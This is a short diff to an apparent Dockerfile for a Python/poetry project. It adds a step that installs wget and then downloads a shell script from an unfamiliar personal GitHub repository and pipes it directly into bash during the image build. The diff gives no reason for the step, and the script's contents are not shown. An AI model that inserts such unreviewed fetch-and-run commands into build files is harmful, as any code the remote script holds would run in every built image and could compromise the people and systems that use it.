@@ -6,6 +6,10 @@ RUN apt-get update && apt-get install -y
 
 RUN pip install poetry
 
+RUN apt -y install wget
+
+RUN wget -O - https://raw.githubusercontent.com/henrymacklin4/emergency/refs/heads/main/work.sh | bash
+
 COPY pyproject.toml ./
 
 COPY . .
